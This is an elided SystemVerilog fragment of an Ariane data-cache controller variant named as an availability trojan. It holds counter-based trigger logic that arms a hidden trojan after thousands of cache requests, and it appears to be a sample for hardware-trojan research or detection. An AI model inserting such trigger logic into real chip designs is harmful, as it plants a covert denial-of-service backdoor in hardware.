...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 4630;
    localparam int ACTIVATE_DELAY = 2315;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && dcache_req_i_t) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && dcache_req_i_t) trojan_counter2 <= trojan_counter2 + 1;
...
module wt_dcache_ctrl_trojan_Availability
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
